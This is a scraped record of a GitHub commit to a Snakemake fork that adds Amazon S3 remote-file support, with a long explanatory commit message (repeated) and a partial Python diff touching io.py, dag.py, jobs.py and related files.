os.path.isabs(workdir):\n            return os.path.abspath(os.path.join(self.workflow.basedir,\n                                                workdir))\n        return workdir\n\n    def target(self, paths):\n        if not_iterable(paths):\n            return flag(os.path.join(self.workdir, paths), \"subworkflow\", self)\n        return [self.target(path) for path in paths]\n\n    def targets(self, dag):\n        return [f for job in dag.jobs for f in job.subworkflow_input\n                if job.subworkflow_input[f] is self]\n\n\nclass Rules:\n    \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\"\n    pass\n\n\ndef srcdir(path):\n    \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\"\n    if not workflow.included_stack:\n        return None\n    return os.path.join(os.path.dirname(workflow.included_stack[-1]), path)\n"}},"msg":"Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read\/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https:\/\/boto.readthedocs.org\/en\/latest\/ref\/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name\/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name\/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/out.txt\")\n        output:\n            \"bucket-name\/out.txt\"\n        run:\n            shell(\"cp {output[0]} .\/\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote\/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard\/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote\/`. This is similar in nature to the function `test_cluster_dynamic\/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS\/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic."}},"https:\/\/github.com\/kyleabeauchamp\/mirrorsnake":{"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d":{"url":"https:\/\/api.github.com\/repos\/kyleabeauchamp\/mirrorsnake\/commits\/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","html_url":"https:\/\/github.com\/kyleabeauchamp\/mirrorsnake\/commit\/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","message":"Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read\/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https:\/\/boto.readthedocs.org\/en\/latest\/ref\/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name\/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name\/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/out.txt\")\n        output:\n            \"bucket-name\/out.txt\"\n        run:\n            shell(\"cp {output[0]} .\/\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote\/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard\/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote\/`. This is similar in nature to the function `test_cluster_dynamic\/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS\/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic.","sha":"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","keyword":"remote code execution protect","diff":"diff --git a\/setup.py b\/setup.py\nindex dfea1dd..97f4d86 100644\n--- a\/setup.py\n+++ b\/setup.py\n@@ -59,6 +59,7 @@ def run_tests(self):\n     },\n     package_data={'': ['*.css', '*.sh', '*.html']},\n     tests_require=['nose>=1.3'],\n+    install_requires=['boto>=2.38.0','filechunkio>=1.6', 'moto>=0.4.14'],\n     cmdclass={'test': NoseTestCommand},\n     classifiers=\n     [\"Development Status :: 5 - Production\/Stable\", \"Environment :: Console\",\ndiff --git a\/snakemake\/dag.py b\/snakemake\/dag.py\nindex f1ead14..e591550 100644\n--- a\/snakemake\/dag.py\n+++ b\/snakemake\/dag.py\n@@ -10,7 +10,7 @@\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n@@ -288,6 +288,51 @@ def unneeded_files():\n             logger.info(\"Removing temporary output file {}.\".format(f))\n             f.remove()\n \n+    def handle_remote(self, job):\n+        \"\"\" Remove local files if they are no longer needed, and upload to S3. \"\"\"\n+        \n+        needed = lambda job_, f: any(\n+            f in files for j, files in self.depending[job_].items()\n+            if not self.finished(j) and self.needrun(j) and j != job)\n+\n+        remote_files = set([f for f in job.expanded_input if f.is_remote]) | set([f for f in job.expanded_output if f.is_remote])\n+        local_files = set([f for f in job.input if not f.is_remote]) | set([f for f in job.expanded_output if not f.is_remote])\n+        files_to_keep = set(f for f in remote_files if is_flagged(f, \"keep\"))\n+\n+        # remove local files from list of remote files\n+        # in case the same file is specified in both places\n+        remote_files -= local_files\n+        remote_files -= files_to_keep\n+\n+        def unneeded_files():\n+            for job_, files in self.dependencies[job].items():\n+                for f in (remote_files & files):\n+                    if not needed(job_, f) and not f.protected:\n+                        yield f\n+            for f in filterfalse(partial(needed, job), [f for f in remote_files]):\n+                if not f in self.targetfiles and not f.protected:\n+                    yield f\n+\n+        def expanded_dynamic_depending_input_files():\n+            for j in self.depending[job]:    \n+                for f in j.expanded_input:\n+                    yield f\n+\n+        unneededFiles = set(unneeded_files())\n+        unneededFiles -= set(expanded_dynamic_depending_input_files())\n+\n+        for f in [f for f in job.expanded_output if f.is_remote]:\n+            if not f.exists_remote:\n+                logger.info(\"Uploading local output file to remote: {}\".format(f))\n+                f.upload_to_remote()\n+\n+        for f in set(unneededFiles):\n+            logger.info(\"Removing local output file: {}\".format(f))\n+            f.remove()\n+\n+        job.rmdir_empty_remote_dirs()\n+\n+\n     def jobid(self, job):\n         if job not in self._jobid:\n             self._jobid[job] = len(self._jobid)\ndiff --git a\/snakemake\/decorators.py b\/snakemake\/decorators.py\nnew file mode 100644\nindex 0000000..063ddde\n--- \/dev\/null\n+++ b\/snakemake\/decorators.py\n@@ -0,0 +1,31 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import functools\n+import inspect\n+\n+\n+def memoize(obj):\n+    cache = obj.cache = {}\n+\n+    @functools.wraps(obj)\n+    def memoizer(*args, **kwargs):\n+        key = str(args) + str(kwargs)\n+        if key not in cache:\n+            cache[key] = obj(*args, **kwargs)\n+        return cache[key]\n+\n+    return memoizer\n+\n+\n+def decAllMethods(decorator, prefix='test_'):\n+\n+    def decClass(cls):\n+        for name, m in inspect.getmembers(cls, inspect.isfunction):\n+            if prefix == None or name.startswith(prefix):\n+                setattr(cls, name, decorator(m))\n+        return cls\n+\n+    return decClass\ndiff --git a\/snakemake\/exceptions.py b\/snakemake\/exceptions.py\nindex d606c99..7440442 100644\n--- a\/snakemake\/exceptions.py\n+++ b\/snakemake\/exceptions.py\n@@ -281,6 +281,13 @@ class IOFileException(RuleException):\n     def __init__(self, msg, lineno=None, snakefile=None):\n         super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n+class RemoteFileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n+\n+class S3FileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n class ClusterJobException(RuleException):\n     def __init__(self, job, jobid, jobscript):\ndiff --git a\/snakemake\/executors.py b\/snakemake\/executors.py\nindex 6bd0114..961e7ba 100644\n--- a\/snakemake\/executors.py\n+++ b\/snakemake\/executors.py\n@@ -109,6 +109,7 @@ def print_job_error(self, job):\n     def finish_job(self, job):\n         self.dag.handle_touch(job)\n         self.dag.check_output(job, wait=self.latency_wait)\n+        self.dag.handle_remote(job)\n         self.dag.handle_protected(job)\n         self.dag.handle_temp(job)\n \ndiff --git a\/snakemake\/io.py b\/snakemake\/io.py\nindex 0ba9cbd..3e32628 100644\n--- a\/snakemake\/io.py\n+++ b\/snakemake\/io.py\n@@ -8,11 +8,12 @@\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n@@ -45,9 +46,46 @@ def __new__(cls, file):\n         obj._file = file\n         obj.rule = None\n         obj._regex = None\n+\n         return obj\n \n+    def __init__(self, file):\n+        self._remote_object = None\n+        if self.is_remote:\n+            additional_args = get_flag_value(self._file, \"additional_remote_args\") if get_flag_value(self._file, \"additional_remote_args\") else []\n+            additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+            self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, *additional_args, **additional_kwargs)\n+        pass\n+\n+    def _referToRemote(func):\n+        \"\"\" \n+            A decorator so that if the file is remote and has a version \n+            of the same file-related function, call that version instead. \n+        \"\"\"\n+        @functools.wraps(func)\n+        def wrapper(self, *args, **kwargs):\n+            if self.is_remote:\n+                if self.remote_object:\n+                    if hasattr( self.remote_object, func.__name__):\n+                        return getattr( self.remote_object, func.__name__)(*args, **kwargs)\n+            return func(self, *args, **kwargs)\n+        return wrapper\n+\n     @property\n+    def is_remote(self):\n+        return is_flagged(self._file, \"remote\")\n+    \n+    @property\n+    def remote_object(self):\n+        if not self._remote_object:\n+            if self.is_remote:\n+               additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+               self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, **additional_kwargs)\n+        return self._remote_object\n+    \n+\n+    @property\n+    @_referToRemote\n     def file(self):\n         if not self._is_function:\n             return self._file\n@@ -56,32 +94,74 @@ def file(self):\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n@@ -108,9 +188,10 @@ def protect(self):\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n@@ -136,11 +217,21 @@ def apply_wildcards(self, wildcards,\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n@@ -166,6 +257,17 @@ def match(self, target):\n     def format_dynamic(self):\n         return self.replace(self.dynamic_fill, \"{*}\")\n \n+    def clone_flags(self, other):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        if isinstance(other._file, AnnotatedString):\n+            self._file.flags = getattr(other._file, \"flags\", {})\n+\n+    def set_flags(self, flags):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        self._file.flags = flags\n+\n     def __eq__(self, other):\n         f = other._file if isinstance(other, _IOFile) else other\n         return self._file == f\n@@ -286,9 +388,17 @@ def flag(value, flag_type, flag_value=True):\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n@@ -297,6 +407,9 @@ def temp(value):\n     if is_flagged(value, \"protected\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n     return flag(value, \"temp\")\n \n \n@@ -310,6 +423,9 @@ def protected(value):\n     if is_flagged(value, \"temp\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n     return flag(value, \"protected\")\n \n \n@@ -318,7 +434,7 @@ def dynamic(value):\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n@@ -334,6 +450,36 @@ def dynamic(value):\n def touch(value):\n     return flag(value, \"touch\")\n \n+def remote(value, provider=S3, keep=False, additional_args=None, additional_kwargs=None):\n+\n+    additional_args = [] if not additional_args else additional_args\n+    additional_kwargs = {} if not additional_kwargs else additional_kwargs\n+\n+    if not provider:\n+        raise RemoteFileException(\"Provider (S3, etc.) must be specified for remote file as kwarg.\")\n+    if is_flagged(value, \"temp\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"protected\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n+    return flag(\n+                flag(\n+                    flag( \n+                        flag( \n+                            flag(value, \"remote\"), \n+                            \"remote_provider\", \n+                            provider\n+                        ), \n+                        \"additional_remote_kwargs\", \n+                        additional_kwargs\n+                    ),\n+                    \"additional_remote_args\",\n+                    additional_args\n+                ),\n+                \"keep\",\n+                keep\n+            )\n \n def expand(*args, **wildcards):\n     \"\"\"\n@@ -410,6 +556,31 @@ def glob_wildcards(pattern):\n                     getattr(wildcards, name).append(value)\n     return wildcards\n \n+def glob_wildcards_remote(pattern, provider=S3, additional_kwargs=None):\n+    additional_kwargs = additional_kwargs if additional_kwargs else {}\n+    referenceObj = IOFile(remote(pattern, provider=provider, **additional_kwargs))\n+    key_list = [k.name for k in referenceObj._remote_object.list] \n+\n+    pattern = \".\/\"+ referenceObj._remote_object.name\n+    pattern = os.path.normpath(pattern)\n+    first_wildcard = re.search(\"{[^{]\", pattern)\n+    dirname = os.path.dirname(pattern[:first_wildcard.start(\n+    )]) if first_wildcard else os.path.dirname(pattern)\n+    if not dirname:\n+        dirname = \".\"\n+\n+    names = [match.group('name')\n+             for match in _wildcard_regex.finditer(pattern)]\n+    Wildcards = namedtuple(\"Wildcards\", names)\n+    wildcards = Wildcards(*[list() for name in names])\n+\n+    pattern = re.compile(regex(pattern))\n+    for f in key_list:\n+        match = re.match(pattern, f)\n+        if match:\n+            for name, value in match.groupdict().items():\n+                getattr(wildcards, name).append(value)\n+    return wildcards\n \n # TODO rewrite Namedlist!\n class Namedlist(list):\ndiff --git a\/snakemake\/jobs.py b\/snakemake\/jobs.py\nindex fdba8b5..317c7c4 100644\n--- a\/snakemake\/jobs.py\n+++ b\/snakemake\/jobs.py\n@@ -13,7 +13,7 @@\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n@@ -131,7 +131,40 @@ def expanded_output(self):\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n@@ -159,6 +192,34 @@ def missing_input(self):\n         return set(f for f in self.input\n                    if not f.exists and not f in self.subworkflow_input)\n \n+\n+    @property\n+    def present_remote_input(self):\n+        files = set()\n+\n+        for f in self.input:\n+            if f.is_remote:\n+                if f.exists_remote:\n+                    files.add(f)\n+        return files\n+    \n+    @property\n+    def present_remote_output(self):\n+        files = set()\n+\n+        for f in self.remote_output:\n+            if f.exists_remote:\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def missing_remote_input(self):\n+        return self.remote_input - self.present_remote_input\n+\n+    @property\n+    def missing_remote_output(self):\n+        return self.remote_output - self.present_remote_output\n+\n     @property\n     def output_mintime(self):\n         \"\"\" Return oldest output file. \"\"\"\n@@ -197,6 +258,74 @@ def missing_output(self, requested=None):\n                     files.add(f)\n         return files\n \n+\n+    @property\n+    def remote_input(self):\n+        for f in self.input:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_output(self):\n+        for f in self.output:\n+            if f.is_remote:\n+                yield f\n+\n+    @property\n+    def remote_input_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_input_older_than_local(self):\n+        files = set()\n+        for f in self.remote_input:\n+            if (f.exists_remote and f.exists_local) and (f.mtime < f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    @property\n+    def remote_output_newer_than_local(self):\n+        files = set()\n+        for f in self.remote_output:\n+            if (f.exists_remote and f.exists_local) and (f.mtime > f.mtime_local):\n+                files.add(f)\n+        return files\n+\n+    